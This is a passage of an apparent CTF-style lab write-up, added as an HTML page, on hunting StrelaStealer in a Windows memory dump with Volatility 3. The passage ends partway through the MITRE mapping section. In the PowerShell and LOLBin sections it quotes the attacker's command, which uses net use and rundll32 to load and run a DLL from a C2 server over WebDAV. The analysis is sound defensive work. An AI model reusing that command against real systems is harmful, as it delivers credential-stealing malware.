@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reveal — Hunting StrelaStealer in Memory | WizB</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --surface: #0f1318;
+    --surface2: #151b22;
+    --border: #1e2730;
+    --accent: #7c5cbf;
+    --accent-light: #a78bfa;
+    --accent2: #00d4aa;
+    --accent3: #ff4757;
+    --text: #c9d1d9;
+    --muted: #586069;
+    --heading: #e6edf3;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --blue: #79b8ff;
+    --orange: #ff6b35;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 15px;
+    line-height: 1.75;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg, transparent, transparent 2px,
+      rgba(124,92,191,0.008) 2px, rgba(124,92,191,0.008) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .back-bar {
+    background: rgba(10,12,15,0.9);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 24px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    backdrop-filter: blur(10px);
+  }
+
+  .back-bar a {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+    text-decoration: none;
+    letter-spacing: 1px;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    transition: color 0.2s;
+  }
+
+  .back-bar a:hover { color: var(--accent-light); }
+
+  .hero {
+    position: relative;
+    padding: 60px 0;
+    text-align: center;
+    overflow: hidden;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(124,92,191,0.1) 0%, transparent 70%);
+  }
+
+  .tag-line {
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent-light);
+    text-transform: uppercase;
+    margin-bottom: 20px;
+    opacity: 0.8;
+  }
+
+  .hero h1 {
+    font-family: var(--sans);
+    font-size: clamp(30px, 5vw, 56px);
+    font-weight: 800;
+    color: var(--heading);
+    line-height: 1.15;
+    margin-bottom: 16px;
+    position: relative;
+  }
+
+  .hero h1 .acc  { color: var(--accent-light); }
+  .hero h1 .red  { color: var(--red); }
+  .hero h1 .grn  { color: var(--accent2); }
+
+  .hero-sub {
+    font-size: 13px;
+    color: var(--muted);
+    margin-bottom: 32px;
+    letter-spacing: 1px;
+  }
+
+  .meta-strip {
+    display: inline-flex;
+    gap: 24px;
+    flex-wrap: wrap;
+    justify-content: center;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 1px;
+  }
+
+  .meta-strip span { display: flex; align-items: center; gap: 6px; }
+  .meta-strip .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent-light); }
+
+  .container { max-width: 860px; margin: 0 auto; padding: 0 24px; }
+
+  .section { padding: 56px 0; border-bottom: 1px solid var(--border); }
+
+  .section-num {
+    font-size: 11px;
+    letter-spacing: 3px;
+    color: var(--accent-light);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    font-weight: 500;
+  }
+
+  h2 {
+    font-family: var(--sans);
+    font-size: clamp(20px, 3vw, 28px);
+    font-weight: 700;
+    color: var(--heading);
+    margin-bottom: 20px;
+    line-height: 1.3;
+  }
+
+  h3 {
+    font-family: var(--sans);
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--heading);
+    margin: 32px 0 14px;
+  }
+
+  p { margin-bottom: 16px; color: var(--text); }
+
+  .alert {
+    border-left: 3px solid var(--accent-light);
+    background: rgba(124,92,191,0.06);
+    padding: 16px 20px;
+    margin: 28px 0;
+    border-radius: 0 6px 6px 0;
+    font-size: 13px;
+  }
+
+  .alert.warn   { border-color: var(--orange); background: rgba(255,107,53,0.06); }
+  .alert.danger { border-color: var(--red);    background: rgba(255,71,87,0.06);  }
+  .alert.green  { border-color: var(--accent2); background: rgba(0,212,170,0.05); }
+  .alert.blue   { border-color: var(--blue);   background: rgba(121,184,255,0.06);}
+
+  .alert-title {
+    font-weight: 700;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    color: var(--accent-light);
+  }
+
+  .alert.warn   .alert-title { color: var(--orange); }
+  .alert.danger .alert-title { color: var(--red); }
+  .alert.green  .alert-title { color: var(--accent2); }
+  .alert.blue   .alert-title { color: var(--blue); }
+
+  .terminal {
+    background: #060809;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin: 24px 0;
+    overflow: hidden;
+  }
+
+  .terminal-header {
+    background: var(--surface2);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .terminal-dots { display: flex; gap: 6px; }
+  .terminal-dots span { width: 10px; height: 10px; border-radius: 50%; }
+  .terminal-dots .r { background: #ff5f57; }
+  .terminal-dots .y { background: #febc2e; }
+  .terminal-dots .g { background: #28c840; }
+  .terminal-title { font-size: 11px; color: var(--muted); letter-spacing: 1px; }
+
+  .terminal-body {
+    padding: 20px;
+    font-size: 13px;
+    line-height: 1.8;
+    overflow-x: auto;
+  }
+
+  .cmd     { color: #79b8ff; }
+  .out     { color: #85e89d; }
+  .comment { color: var(--muted); font-style: italic; }
+  .hi      { color: var(--yellow); }
+  .path    { color: #d2a8ff; }
+  .red-txt { color: var(--red); }
+  .grn-txt { color: var(--accent2); }
+  .pur-txt { color: var(--accent-light); }
+  .ora-txt { color: var(--orange); }
+
+  .findings-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 16px;
+    margin: 24px 0;
+  }
+
+  .finding-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 18px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .finding-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
+  .finding-card.purple::before { background: var(--accent-light); }
+  .finding-card.green::before  { background: var(--accent2); }
+  .finding-card.red::before    { background: var(--red); }
+  .finding-card.orange::before { background: var(--orange); }
+  .finding-card.blue::before   { background: var(--blue); }
+
+  .finding-label { font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: 8px; }
+  .finding-value { font-size: 13px; font-weight: 700; color: var(--heading); word-break: break-all; line-height: 1.4; }
+
+  /* Process chain */
+  .proc-chain {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 28px 0;
+  }
+
+  .proc-step { display: flex; gap: 16px; align-items: flex-start; }
+  .proc-left { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; width: 36px; }
+
+  .proc-num {
+    width: 32px; height: 32px; border-radius: 6px;
+    background: var(--accent); color: var(--bg);
+    font-size: 12px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    background: var(--accent-light);
+  }
+
+  .proc-num.red    { background: var(--red); }
+  .proc-num.orange { background: var(--orange); }
+  .proc-num.green  { background: var(--accent2); color: #000; }
+
+  .proc-connector { width: 2px; flex: 1; min-height: 24px; background: var(--border); margin: 4px 0; }
+  .proc-content { flex: 1; padding-bottom: 28px; }
+  .proc-step:last-child .proc-content { padding-bottom: 0; }
+  .proc-title { font-family: var(--sans); font-weight: 700; color: var(--heading); font-size: 15px; margin-bottom: 6px; margin-top: 4px; }
+  .proc-desc  { font-size: 13px; color: var(--muted); line-height: 1.7; }
+
+  .proc-tag {
+    display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 3px;
+    font-weight: 700; letter-spacing: 1px; text-transform: uppercase; margin-top: 8px;
+    background: rgba(124,92,191,0.1); color: var(--accent-light); border: 1px solid rgba(124,92,191,0.25);
+  }
+  .proc-tag.red    { background: rgba(255,71,87,0.1);  color: var(--red);     border-color: rgba(255,71,87,0.25); }
+  .proc-tag.orange { background: rgba(255,107,53,0.1); color: var(--orange);  border-color: rgba(255,107,53,0.25); }
+  .proc-tag.green  { background: rgba(0,212,170,0.1);  color: var(--accent2); border-color: rgba(0,212,170,0.25); }
+
+  /* MITRE grid */
+  .mitre-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 24px 0; }
+  .mitre-card {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 16px 18px; border-left: 3px solid var(--accent);
+  }
+  .mitre-id   { font-size: 11px; color: var(--accent-light); letter-spacing: 1px; font-weight: 700; margin-bottom: 6px; }
+  .mitre-name { font-size: 13px; color: var(--heading); font-weight: 600; margin-bottom: 4px; }
+  .mitre-desc { font-size: 12px; color: var(--muted); line-height: 1.6; }
+
+  /* IOC table */
+  .ioc-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; margin: 24px 0; }
+  .ioc-table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 520px; }
+  .ioc-table th {
+    background: var(--surface2); color: var(--accent-light);
+    font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+    padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border);
+  }
+  .ioc-table td { padding: 12px 16px; border-bottom: 1px solid rgba(30,39,48,0.5); vertical-align: top; }
+  .ioc-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; letter-spacing: 1px; font-weight: 700; text-transform: uppercase; }
+  .badge-red    { background: rgba(255,71,87,0.15);  color: var(--red);          border: 1px solid rgba(255,71,87,0.3);    }
+  .badge-purple { background: rgba(124,92,191,0.15); color: var(--accent-light); border: 1px solid rgba(124,92,191,0.3);   }
+  .badge-green  { background: rgba(0,212,170,0.1);   color: var(--accent2);      border: 1px solid rgba(0,212,170,0.25);   }
+  .badge-orange { background: rgba(255,107,53,0.1);  color: var(--orange);       border: 1px solid rgba(255,107,53,0.3);   }
+  .badge-blue   { background: rgba(121,184,255,0.1); color: var(--blue);         border: 1px solid rgba(121,184,255,0.3);  }
+  .badge-yellow { background: rgba(255,211,42,0.1);  color: var(--yellow);       border: 1px solid rgba(255,211,42,0.25);  }
+
+  code {
+    background: var(--surface2); padding: 2px 7px; border-radius: 4px;
+    font-family: var(--mono); font-size: 12px; color: #d2a8ff;
+    border: 1px solid var(--border);
+  }
+
+  .highlight-box {
+    background: linear-gradient(135deg, rgba(124,92,191,0.06), rgba(0,212,170,0.04));
+    border: 1px solid rgba(124,92,191,0.2);
+    border-radius: 10px;
+    padding: 24px 28px;
+    margin: 28px 0;
+  }
+
+  /* Thunderbird reveal box */
+  .reveal-box {
+    background: linear-gradient(135deg, rgba(255,71,87,0.06), rgba(124,92,191,0.08));
+    border: 1px solid rgba(255,71,87,0.25);
+    border-radius: 10px;
+    padding: 28px;
+    margin: 28px 0;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .reveal-box::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, var(--red), var(--accent-light));
+  }
+
+  .reveal-title {
+    font-family: var(--sans);
+    font-size: 18px;
+    font-weight: 800;
+    color: var(--heading);
+    margin-bottom: 14px;
+  }
+
+  @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+  .cursor { display: inline-block; width: 8px; height: 15px; background: var(--accent-light); vertical-align: middle; animation: blink 1.2s infinite; margin-left: 2px; }
+
+  .footer { padding: 48px 0; text-align: center; }
+  .footer-sig  { font-size: 12px; color: var(--muted); margin-bottom: 8px; }
+  .footer-name { font-family: var(--sans); font-size: 18px; font-weight: 700; color: var(--accent-light); }
+
+  @media (max-width: 600px) {
+    .findings-grid { grid-template-columns: 1fr; }
+    .mitre-grid    { grid-template-columns: 1fr; }
+    .container { padding: 0 16px; }
+    .section   { padding: 40px 0; }
+    .hero      { padding: 40px 0; }
+    .terminal-body { font-size: 11px; }
+    h2 { font-size: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="back-bar">
+  <a href="./index.html">← Back to Writeups</a>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="container">
+    <div class="tag-line">CyberDefenders · Reveal Lab · Memory Forensics · Volatility</div>
+    <h1>
+      <span class="acc">Reveal</span> —<br>
+      Hunting <span class="red">StrelaStealer</span><br>
+      in Memory
+    </h1>
+    <div class="hero-sub">Financial Institution Incident Response · Windows 10 · Volatility 3 · Hidden PowerShell · LOLBin Execution</div>
+    <div class="meta-strip">
+      <span><span class="dot"></span> Memory Forensics</span>
+      <span><span class="dot"></span> Volatility 3</span>
+      <span><span class="dot"></span> StrelaStealer</span>
+      <span><span class="dot"></span> T1218.011 LOLBin</span>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- 00 BACKGROUND -->
+<div class="section">
+  <div class="section-num">00 — Background</div>
+  <h2>The Case: Unusual Activity on a Financial Workstation</h2>
+
+  <p>
+    A forensic investigator at a <strong>financial institution</strong> receives an urgent callout. The SIEM has flagged unusual activity originating from a workstation with access to <strong>sensitive financial data</strong>. The machine belongs to a user named <strong>Elom</strong>. A memory dump has been acquired — the task is to figure out what happened before the evidence degrades further.
+  </p>
+
+  <p>
+    This is a pure memory forensics investigation — no disk image, no email archive, no network logs. Just a snapshot of RAM at a single point in time, and everything we need to know is buried somewhere inside it. The challenge is knowing where to look.
+  </p>
+
+  <div class="alert">
+    <div class="alert-title">🔬 Investigation Approach</div>
+    Memory forensics is surgical. Unlike disk forensics where you can browse a filesystem, a memory dump gives you a frozen moment — processes that were running, network connections that were active, commands that were executing. Miss the right artifact and the whole picture falls apart. This investigation walks through the Volatility 3 plugin chain that cracked it open.
+  </div>
+
+  <div class="findings-grid">
+    <div class="finding-card purple">
+      <div class="finding-label">Target</div>
+      <div class="finding-value">Financial Institution Workstation</div>
+    </div>
+    <div class="finding-card blue">
+      <div class="finding-label">OS</div>
+      <div class="finding-value">Windows 10 x64 Build 19041.1</div>
+    </div>
+    <div class="finding-card orange">
+      <div class="finding-label">Memory Captured</div>
+      <div class="finding-value">2024-07-15 07:00:08</div>
+    </div>
+    <div class="finding-card red">
+      <div class="finding-label">Suspect User</div>
+      <div class="finding-value">Elom</div>
+    </div>
+    <div class="finding-card green">
+      <div class="finding-label">Malware Family</div>
+      <div class="finding-value">StrelaStealer</div>
+    </div>
+    <div class="finding-card purple">
+      <div class="finding-label">C2 Server</div>
+      <div class="finding-value">45.9.74.32</div>
+    </div>
+  </div>
+</div>
+
+<!-- 01 INITIAL TRIAGE -->
+<div class="section">
+  <div class="section-num">01 — Initial Triage</div>
+  <h2>Establishing Ground Truth</h2>
+
+  <p>
+    Before hunting for anything suspicious, the first step is always establishing the baseline — what machine is this, what OS, when was the dump taken. <code>windows.info</code> gave us everything we needed.
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">vol.py -f memory.dmp windows.info</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># System baseline from memory dump:</span></div>
+      <div><span class="out">OS:           <span class="hi">Windows 10 x64</span></span></div>
+      <div><span class="out">Build:        <span class="hi">19041.1.amd64fre.vb_release.1912</span></span></div>
+      <div><span class="out">System Time:  <span class="hi">2024-07-15 07:00:08</span></span></div>
+      <br>
+      <div><span class="comment"># Memory dump taken at 07:00:08 — early morning</span></div>
+      <div><span class="comment"># Financial workstation, Windows 10, confirmed</span></div>
+    </div>
+  </div>
+
+  <h3>Process Enumeration — The Noise Problem</h3>
+  <p>
+    Running <code>pslist</code> and <code>pstree</code> revealed a large number of running processes — a typical Windows 10 environment generates significant process noise. Identifying something malicious purely by eye from a process list is harder than it sounds. Legitimate-looking process names, plausible parent-child relationships, nothing obviously screaming "malware."
+  </p>
+
+  <div class="alert blue">
+    <div class="alert-title">🔍 Analyst Note — The Noise Problem</div>
+    This is one of the most underappreciated challenges in memory forensics. A modern Windows machine runs 60-100+ processes at any given time. Attackers know this — they deliberately name malicious processes after legitimate system binaries, choose parent processes that make sense, and time their execution to blend in. Pattern recognition alone doesn't work. You need the right plugins.
+  </div>
+</div>
+
+<!-- 02 MALFIND -->
+<div class="section">
+  <div class="section-num">02 — Finding the Needle</div>
+  <h2>malfind — Cutting Through the Noise</h2>
+
+  <p>
+    When <code>pslist</code> and <code>pstree</code> don't immediately reveal the threat, <code>malfind</code> is the next weapon. It scans memory for regions that have suspicious characteristics — executable code in regions that shouldn't have it, mismatched PE headers, memory sections marked as both writeable and executable (a classic injection indicator).
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">vol.py -f memory.dmp windows.malfind</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># Suspicious processes flagged by malfind:</span></div>
+      <br>
+      <div><span class="out">Process: <span class="hi">RuntimeBroker.exe</span></span></div>
+      <div><span class="out">Process: <span class="hi">thunderbird.exe</span>      <span class="comment">← email client</span></span></div>
+      <div><span class="out">Process: <span class="hi">SmartScreen.exe</span></span></div>
+      <div><span class="out">Process: <span class="hi">powershell.exe</span>        <span class="comment">← can execute scripts</span></span></div>
+      <br>
+      <div><span class="comment"># Four processes with suspicious memory characteristics</span></div>
+      <div><span class="comment"># powershell.exe is the most immediately actionable — dig here first</span></div>
+    </div>
+  </div>
+
+  <p>
+    Four flagged processes. PowerShell is the obvious starting point — it's the Swiss Army knife of Windows attack chains. But note that <strong>thunderbird.exe</strong> is also on the list. We'll come back to that.
+  </p>
+</div>
+
+<!-- 03 POWERSHELL ANALYSIS -->
+<div class="section">
+  <div class="section-num">03 — The PowerShell Process</div>
+  <h2>PID 3692 — Hidden, Connected, and Running</h2>
+
+  <h3>Process Identity</h3>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">vol.py windows.pstree — powershell.exe</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># PowerShell process details:</span></div>
+      <div><span class="out">Name:  <span class="hi">powershell.exe</span></span></div>
+      <div><span class="out">PID:   <span class="hi">3692</span></span></div>
+      <div><span class="out">PPID:  <span class="red-txt">4120</span></span></div>
+      <br>
+      <div><span class="comment"># Checking PPID 4120 — wordpad.exe shares same PPID</span></div>
+      <div><span class="comment"># But no process with PID 4120 exists in the dump</span></div>
+      <div><span class="out">Parent PID 4120: <span class="red-txt">NOT FOUND — process terminated before dump</span></span></div>
+      <br>
+      <div><span class="comment"># pstree also reveals hidden network activity</span></div>
+      <div><span class="comment"># and DLL execution under this process</span></div>
+    </div>
+  </div>
+
+  <div class="alert warn">
+    <div class="alert-title">⚠️ Orphaned Parent — Classic Evasion</div>
+    The parent process (PID 4120) spawned both powershell.exe and wordpad.exe — then terminated itself before the memory dump was taken. This is deliberate. By killing the parent, the attacker removes the most obvious evidence of how PowerShell was launched. The orphaned process relationship is itself a red flag, but the launch chain is now partially obscured.
+  </div>
+
+  <h3>The Hidden Window Flag</h3>
+  <p>
+    The <code>cmdline</code> plugin revealed exactly how PowerShell was invoked — and it confirmed malicious intent immediately:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">vol.py windows.cmdline — PID 3692</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># Full command line for powershell.exe PID 3692:</span></div>
+      <div><span class="out">powershell.exe <span class="red-txt">-windowstyle hidden</span></span></div>
+      <br>
+      <div><span class="comment"># -windowstyle hidden = no visible window to the user</span></div>
+      <div><span class="comment"># PowerShell is running completely invisibly</span></div>
+      <div><span class="comment"># User at the keyboard would have no idea</span></div>
+    </div>
+  </div>
+
+  <div class="alert warn">
+    <div class="alert-title">🚨 Windowstyle Hidden</div>
+    <code>-windowstyle hidden</code> is one of the most common malicious PowerShell flags. It suppresses the terminal window entirely — the process runs silently in the background with zero visual indicator. Combined with an orphaned parent process, this is a deliberate effort to ensure the victim never sees what's executing on their machine. MITRE ATT&CK: <strong>T1564.003 — Hide Artifacts: Hidden Window</strong>.
+  </div>
+
+  <h3>Network Connection — The Remote Server</h3>
+  <p>
+    pstree output for PID 3692 revealed hidden network activity. The <code>net use</code> command embedded in the PowerShell execution connected to an external server:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">network connection — PID 3692</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># Net use command connecting to remote server:</span></div>
+      <div><span class="out">net use <span class="red-txt">\\45.9.74.32@8888\davwwwroot\</span></span></div>
+      <br>
+      <div><span class="comment"># WebDAV connection to 45.9.74.32 on port 8888</span></div>
+      <div><span class="comment"># "davwwwroot" = shared directory on remote C2 server</span></div>
+      <div><span class="comment"># Facilitates remote file access — loading payloads directly from C2</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- 04 LOLBIN -->
+<div class="section">
+  <div class="section-num">04 — The LOLBin Chain</div>
+  <h2>rundll32 — Living off the Land</h2>
+
+  <p>
+    The semicolon in the PowerShell command allowed two instructions to execute on a single line — the <code>net use</code> connection followed immediately by the payload execution. The second command is where it gets sophisticated:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">full powershell execution chain</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># Full execution chain — two commands on one line:</span></div>
+      <br>
+      <div><span class="out">net use <span class="hi">\\45.9.74.32@8888\davwwwroot\</span></span></div>
+      <div><span class="comment"># ^ establishes WebDAV connection to C2</span></div>
+      <br>
+      <div><span class="out">; rundll32 <span class="red-txt">\\45.9.74.32@8888\davwwwroot\3435.dll,entry</span></span></div>
+      <div><span class="comment"># ^ loads 3435.dll directly from C2 shared directory</span></div>
+      <div><span class="comment"># ^ calls the "entry" export function to execute payload</span></div>
+      <br>
+      <div><span class="comment"># rundll32.exe is a legitimate Windows binary</span></div>
+      <div><span class="comment"># being used to execute a malicious DLL over the network</span></div>
+      <div><span class="comment"># This is the 2nd-stage payload delivery</span></div>
+    </div>
+  </div>
+
+  <div class="alert warn">
+    <div class="alert-title">🔗 Living off the Land — T1218.011</div>
+    <code>rundll32.exe</code> is a trusted, signed Windows binary present on every Windows machine. By loading the malicious DLL through rundll32 rather than dropping and executing it directly, the attacker bypasses many AV and EDR controls that would flag an unknown executable. The DLL is also never written to disk — it's loaded directly over the WebDAV connection from the C2 server. <strong>Fileless execution.</strong> MITRE ATT&CK: <strong>T1218.011 — Signed Binary Proxy Execution: Rundll32</strong>.
+  </div>
+
+  <h3>The User Behind the Process</h3>
+  <p>
+    The <code>getsids</code> plugin identified which user account the malicious process was running under:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">vol.py windows.getsids — PID 3692</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># User account running the malicious process:</span></div>
+      <div><span class="out">Username: <span class="red-txt">Elom</span></span></div>
+      <br>
+      <div><span class="comment"># The malware is running under the legitimate user's account</span></div>
+      <div><span class="comment"># No privilege escalation needed — user-level access</span></div>
+      <div><span class="comment"># on a financial workstation is already sufficient</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- 05 ATTRIBUTION -->
+<div class="section">
+  <div class="section-num">05 — Attribution</div>
+  <h2>45.9.74.32 — StrelaStealer</h2>
+
+  <p>
+    With the C2 IP identified, the final step was attribution. A VirusTotal lookup on <code>45.9.74.32</code> connected the malicious file to a well-documented and actively developed malware family:
+  </p>
+
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div>
+      <div class="terminal-title">virustotal — 45.9.74.32 lookup</div>
+    </div>
+    <div class="terminal-body">
+      <div><span class="comment"># IP reputation lookup:</span></div>
+      <div><span class="out">IP: <span class="red-txt">45.9.74.32</span></span></div>
+      <div><span class="out">Associated malware family: <span class="red-txt">STRELASTEALER</span></span></div>
+      <br>
+      <div><span class="comment"># Malicious DLL loaded via rundll32:</span></div>
+      <div><span class="out">File: <span class="hi">3435.dll</span></span></div>
+      <div><span class="out">Delivered via: WebDAV over port 8888</span></div>
+      <div><span class="out">Execution: rundll32.exe → entry export function</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- 06 THE REVEAL -->
+<div class="section">
+  <div class="section-num">06 — The Reveal</div>
+  <h2>Why Thunderbird Was Always the Target</h2>
+
+  <p>
+    Remember thunderbird.exe — the email client that appeared in the malfind output alongside powershell.exe? That wasn't coincidence. That was the entire point.
+  </p>
+
+  <div class="reveal-box">
+    <div class="reveal-title">StrelaStealer — Built to Hunt Email Credentials</div>
+    <p style="font-size:13px;line-height:1.9;color:var(--text);margin-bottom:0;">
+      StrelaStealer is not general-purpose malware. It is a <strong>credential stealer specifically engineered to target email clients</strong> — primarily Mozilla Thunderbird and Microsoft Outlook. It was first documented in late 2022 and has been in active development since, with multiple campaigns targeting organizations across Europe and the United States.<br><br>
+      Its primary objective: extract email account credentials stored locally by the email client — usernames, passwords, server configurations — and exfiltrate them to the attacker's C2 infrastructure.<br><br>
+      The presence of <strong>thunderbird.exe</strong> in the malfind output wasn't a red herring. StrelaStealer had already injected into or was monitoring Thunderbird's process — the email client on a <strong>financial institution workstation</strong> was the prize. Whatever email credentials Elom's Thunderbird had stored — corporate email access, potentially financial system notifications, internal communications — StrelaStealer was there to take them.<br><br>
+      The hidden PowerShell window, the WebDAV C2 channel, the rundll32 LOLBin execution, the fileless DLL — all of it was infrastructure built for one purpose: to get StrelaStealer's hooks into that Thunderbird process without triggering an alert.
+    </p>
+  </div>
+
+  <div class="alert danger">
+    <div class="alert-title">💀 The Full Picture</div>
+    A financial institution employee with sensitive data access. An email client running on their workstation. A credential stealer that specifically hunts email clients. Fileless execution to avoid AV. A hidden PowerShell window to avoid user detection. An orphaned parent process to obscure the launch chain. This wasn't opportunistic — this was a targeted operation against a specific type of victim with a specific type of access.
+  </div>
+</div>
+
+<!-- 07 EXECUTION CHAIN -->
+<div class="section">
+  <div class="section-num">07 — Full Execution Chain</div>
+  <h2>How It All Connected</h2>
+
+  <div class="proc-chain">
+    <div class="proc-step">
+      <div class="proc-left"><div class="proc-num">01</div><div class="proc-connector"></div></div>
+      <div class="proc-content">
+        <div class="proc-title">Unknown Parent Process Executes</div>
+        <div class="proc-desc">A process with PID 4120 — likely the initial dropper or loader — spawns both powershell.exe (PID 3692) and wordpad.exe. The parent then terminates itself to erase the launch chain before the memory dump is taken.</div>
+        <span class="proc-tag red">Parent Self-Terminates — Evasion</span>
+      </div>
+    </div>
+    <div class="proc-step">
+      <div class="proc-left"><div class="proc-num orange">02</div><div class="proc-connector"></div></div>
+      <div class="proc-content">
+        <div class="proc-title">Hidden PowerShell Launches</div>
+        <div class="proc-desc">powershell.exe PID 3692 runs with -windowstyle hidden. No terminal window visible to the user. Completely silent execution.</div>
+        <span class="proc-tag orange">T1564.003 — Hidden Window</span>
+      </div>
+    </div>
+    <div class="proc-step">
+      <div class="proc-left"><div class="proc-num orange">03</div><div class="proc-connector"></div></div>
+      <div class="proc-content">
+        <div class="proc-title">WebDAV Connection to C2</div>
+        <div class="proc-desc">net use establishes a WebDAV share connection to \\45.9.74.32@8888\davwwwroot\ — mounting the attacker's remote server as an accessible network share.</div>
+        <span class="proc-tag orange">T1071.001 — Web Protocols C2</span>
+      </div>
+    </div>
+    <div class="proc-step">
+      <div class="proc-left"><div class="proc-num red">04</div><div class="proc-connector"></div></div>
+      <div class="proc-content">
+        <div class="proc-title">rundll32 Loads Malicious DLL</div>
+        <div class="proc-desc">rundll32.exe loads 3435.dll directly from the WebDAV share. The DLL is never written to disk. Calls the "entry" export function to execute the 2nd-stage payload — StrelaStealer.</div>
+        <span class="proc-tag red">T1218.011 — Signed Binary Proxy: Rundll32</span>
+      </div>
+    </div>
+    <div class="proc-step">
+      <div class="proc-left"><div class="proc-num red">05</div></div>
+      <div class="proc-content">
+        <div class="proc-title">StrelaStealer Targets Thunderbird</div>
+        <div class="proc-desc">StrelaStealer payload executes under user "Elom". Targets thunderbird.exe — already running on the financial workstation. Email credentials extracted and exfiltrated to C2 at 45.9.74.32.</div>
+        <span class="proc-tag red">T1555 — Credentials from Password Stores</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 08 MITRE -->
+<div class="section">
+  <div class="section-num">08 — MITRE ATT&CK Mapping</div>
+  <h2>Techniques Observed</h2>
+
+  <div class="mitre-grid">
+    <div class="mitre-card">
+      <div class="mitre-id">T1059.001</div>
+      <div class="mitre-name">PowerShell</div>
+      <div class="mitre-desc">Hidden PowerShell execution as primary attack vector</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1564.003</div>
+      <div class="mitre-name">Hidden Window</div>
+      <div class="mitre-desc">-windowstyle hidden flag suppresses PowerShell terminal</div>
+    </div>
+    <div class="mitre-card">
+      <div class="mitre-id">T1218.011</div>
+      <div class="mitre-name">Signed Binary Proxy: Rundll32</div>
